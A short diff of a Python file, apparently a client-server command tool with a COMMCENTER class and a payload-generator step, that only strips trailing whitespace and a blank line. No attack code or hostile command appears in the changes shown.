@@ -13,7 +13,7 @@ import socket
 import time
 import base64
 import tabulate
-import signal 
+import signal
 import subprocess
 import argparse
 import shutil
@@ -407,7 +407,7 @@ class COMMCENTER:
             sys.stdout.write("\n")
             pull.error("You need to connect to client before execute this command")
             sys.stdout.write("\n")
-    
+
     def c_clear(self):
         subprocess.call(["clear"], shell=True)
 
@@ -831,7 +831,6 @@ def main():
             generator.compile()
             generator.clean()
             pull.function("Done!")
-
 
 if __name__ == "__main__":
     main()
